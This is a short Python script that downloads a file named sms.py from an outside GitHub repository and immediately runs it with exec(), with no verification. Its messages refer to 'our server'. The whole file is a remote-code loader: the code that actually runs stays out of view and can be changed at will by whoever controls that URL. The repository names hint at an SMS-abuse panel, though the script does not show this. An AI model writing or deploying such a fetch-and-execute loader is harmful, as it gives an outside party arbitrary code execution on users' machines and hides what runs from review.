import requests
import subprocess
import io

# Define the URL where your code is hosted
remote_code_url = "https://raw.githubusercontent.com/puzzleshockk1/pzpanel/main/Puzshockx/programs/sms.py"

# Fetch the code from the URL
response = requests.get(remote_code_url)

if response.status_code == 200:
    # Read the fetched code
    remote_code = response.text

    # Execute the fetched code as a Python script
    try:
        exec(remote_code)
    except Exception as e:
        print(f"An error occurred while executing code from our server: {e}")
else:
    print(f"Failed to fetch code from  our server: {remote_code_url}")
